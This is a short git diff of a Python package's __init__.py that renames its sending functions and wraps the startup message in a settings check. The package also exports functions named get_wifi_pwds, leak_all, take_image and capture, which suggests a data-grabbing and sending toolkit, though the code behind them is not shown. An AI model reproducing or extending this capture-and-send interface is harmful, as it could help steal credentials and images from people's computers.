@@ -16,8 +16,7 @@ from .zip.zipping import create_zip
 
 from .data.get_data import take_image, capture, get_wifi_pwds, leak_all
 
-from .send.send_data import send_data
-
+from .send.send_data import send_file, send_embed
 
 # Package metadata
 __all__ = [
@@ -34,7 +33,8 @@ __all__ = [
     "capture",
     "get_wifi_pwds",
     "leak_all",
-    "send_data"
+    "send_file",
+    "send_embed"
 ]
 __author__ = "AJ-Holzer"
 __version__ = "1.0.0"
@@ -43,5 +43,17 @@ __license__ = "MIT"
 __description__ = "This is a module which allows you to modify your pc or doing just some little things."
 __url__ = "https://github.com/AJ-Holzer/AJ-Module"
 
-# Initialization code
-print(f"Package '{__name__}' version {__version__} initialized...\n")
+
+
+def start_msg():
+    # Run this code before the module starts
+    from .settings import settings
+
+    # Initialization code
+    if settings.send_init_msg:
+        import os
+
+        msg = settings.ITALIC + f"--> Package '{__name__}' version {__version__} initialized...\n" + settings.RESET
+        print(msg)
+
+start_msg()
